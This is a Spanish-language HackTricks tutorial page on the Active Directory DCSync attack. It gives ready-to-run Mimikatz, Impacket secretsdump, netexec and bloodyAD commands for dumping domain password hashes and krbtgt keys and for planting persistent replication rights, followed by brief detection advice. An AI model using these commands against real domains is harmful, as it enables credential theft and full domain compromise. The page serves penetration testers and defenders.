# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

El permiso **DCSync** implica tener estos permisos sobre el propio dominio: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** y **Replicating Directory Changes In Filtered Set**.<sup>[[3]](#references)</sup>

**Notas importantes sobre DCSync:**

- El **ataque DCSync simula el comportamiento de un Domain Controller y solicita a otros Domain Controllers que repliquen información** mediante el Directory Replication Service Remote Protocol (MS-DRSR). Como MS-DRSR es una función válida y necesaria de Active Directory, no se puede desactivar ni deshabilitar.
- De forma predeterminada, solo los grupos **Domain Admins, Enterprise Admins, Administrators y Domain Controllers** tienen los privilegios necesarios.
- En la práctica, **DCSync completo** requiere **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** en el contexto de nomenclatura del dominio. `DS-Replication-Get-Changes-In-Filtered-Set` suele delegarse junto con ellos, pero por sí solo es más relevante para sincronizar **atributos confidenciales o filtrados por RODC** (por ejemplo, secretos heredados de tipo LAPS) que para obtener un volcado completo de krbtgt.<sup>[[2]](#references)</sup>
- Si las contraseñas de alguna cuenta se almacenan con cifrado reversible, Mimikatz ofrece una opción para devolver la contraseña en texto claro.

### Enumeración

Comprueba quién tiene estos permisos mediante `powerview`:

```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```

Si quieres centrarte en **las identidades no predeterminadas** con derechos de DCSync, excluye los grupos integrados con capacidad de replicación y revisa solo las entidades de seguridad inesperadas:

```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
  Where-Object {
    $_.ObjectType -match 'replication-get' -or
    $_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
  } |
  Where-Object { $_.IdentityReference -notmatch $default } |
  Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```

### Exploit localmente

```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

### Exploit de forma remota

```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```

Ejemplos prácticos dentro del alcance:<sup>[[1]](#references)</sup>

```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```

### DCSync usando un TGT de máquina de un DC capturado (ccache)

Al revisar un servicio en un controlador de dominio, distingue su identidad de servicio local de su identidad de red. [Microsoft documenta](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions) que las cuentas virtuales de SQL Server (`NT SERVICE\...`) acceden a los recursos de red como la cuenta de equipo del host. En un controlador de dominio, esto puede hacer que la cuenta de máquina del DC sea relevante al revisar los derechos de replicación, pero obtener acceso a un servicio por sí solo no demuestra que se pueda exportar un TGT de máquina ni que se pueda usar para autenticarse mediante DCSync. Verifica la identidad real del servicio, el contexto de autenticación saliente, los tickets o las credenciales disponibles y los derechos de replicación efectivos antes de considerar esto una vía.

En escenarios de unconstrained delegation en modo de exportación, puedes capturar un TGT de máquina de un controlador de dominio (p. ej., `DC1$@DOMAIN` para `krbtgt@DOMAIN`). Luego puedes usar ese ccache para autenticarte como el DC y realizar DCSync sin contraseña.<sup>[[5]](#references)</sup>

```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```

Notas operativas:

- **La ruta Kerberos de Impacket primero accede a SMB** antes de la llamada a DRSUAPI. Si el entorno aplica **SPN target name validation**, puede que falle un dump completo con el mensaje `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
- En ese caso, solicita primero un ticket de servicio **`cifs/<dc>`** para el DC de destino o recurre a **`-just-dc-user`** para la cuenta que necesites de inmediato.
- Si solo tienes permisos de replicación limitados, la sincronización al estilo LDAP/DirSync aún puede exponer atributos **confidenciales** o **filtrados por RODC** (por ejemplo, el atributo heredado `ms-Mcs-AdmPwd`) sin replicar todo krbtgt.<sup>[[2]](#references)</sup>

`-just-dc` genera 3 archivos:

- uno con los **hashes NTLM**
- uno con las **claves Kerberos**
- uno con las contraseñas en texto claro de NTDS para las cuentas que tengan habilitada la [**cifrado reversible**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption). Puedes obtener los usuarios con cifrado reversible mediante

  ```bash
  Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
  ```

### Persistencia

Si eres administrador de dominio, puedes conceder estos permisos a cualquier usuario con la ayuda de PowerView:<sup>[[3]](#references)</sup>

```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```

Los operadores de Linux pueden hacer lo mismo con `bloodyAD`:

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```

Luego, puedes **comprobar si al usuario se le asignaron correctamente** los 3 privilegios buscándolos en el resultado (deberías poder ver los nombres de los privilegios en el campo "ObjectType"):

```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```

### Mitigación

- Security Event ID 4662 (Debe habilitarse la directiva de auditoría para el objeto): se realizó una operación en un objeto<sup>[[4]](#references)</sup>
- Security Event ID 5136 (Debe habilitarse la directiva de auditoría para el objeto): se modificó un objeto del servicio de directorio
- Security Event ID 4670 (Debe habilitarse la directiva de auditoría para el objeto): se cambiaron los permisos de un objeto
- AD ACL Scanner: crea y compara informes de ACL. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [1] [Registro de cambios de Impacket](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [2] [DirSync: aprovechamiento de Replication Get-Changes y Get-Changes-In-Filtered-Set](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [3] [DCSync: volcado de hashes de contraseñas desde el controlador de dominio](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [4] [DCSync](https://yojimbosecurity.ninja/dcsync/)
- [5] [HTB: Delegate — credenciales de SYSVOL → Targeted Kerberoast → Unconstrained Delegation → DCSync para obtener DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
{{#include ../../banners/hacktricks-training.md}}
